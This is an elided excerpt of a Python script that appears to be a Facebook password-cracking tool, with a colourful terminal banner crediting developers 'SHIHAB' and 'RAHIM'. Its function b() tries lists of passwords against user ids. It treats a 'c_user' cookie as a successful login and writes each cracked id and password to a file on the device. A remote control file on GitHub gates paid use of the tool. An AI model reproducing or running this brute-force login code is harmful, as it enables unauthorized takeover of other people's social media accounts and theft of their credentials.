...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; 𝕊ℍ𝕀ℍ𝔸𝔹 𝕏 ℝ𝔸ℍ𝕀𝕄  \x07')
...
\x1b[38;5;46m______________________________________________________
 \033[1;31m[\033[1;32m[S]\033[1;31m]\033[1;32m DEVELOPER : 𝕄ℝ 𝕊ℍ𝕀ℍ𝔸𝔹 
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : 𝔸𝔹𝔻𝕌ℝ ℝ𝔸ℍ𝕀𝕄
 \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : ABDUR RAHIM (SHIHAB)  
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m GITHUB    : ABDUR-RAHIM-SHIHAB
 \033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m TOOLS     : RENDOM
 \033[1;31m[\033[1;32m[B]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-9]
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/mdrahimshihab?mibextid=ZbWKwL');time.sleep(1)
		fb()
	if opt in ["D","4"]:
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/ABDUR-RAHIM-SHIHAB');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[𝕊ℍ𝕀ℍ𝔸𝔹]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [𝕊ℍ𝕀ℍ𝔸𝔹-OK] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/𝕊ℍ𝕀ℍ𝔸𝔹-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Masud-𝕊ℍ𝕀ℍ𝔸𝔹404/PAID-TEST/blob/main/CONTROL.tex").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am 𝕊ℍ𝕀ℍ𝔸𝔹 VAI er  ROBOT and my boss is 𝕊ℍ𝕀ℍ𝔸𝔹.Sir this tool is paid because 100% ok id just now login\"")
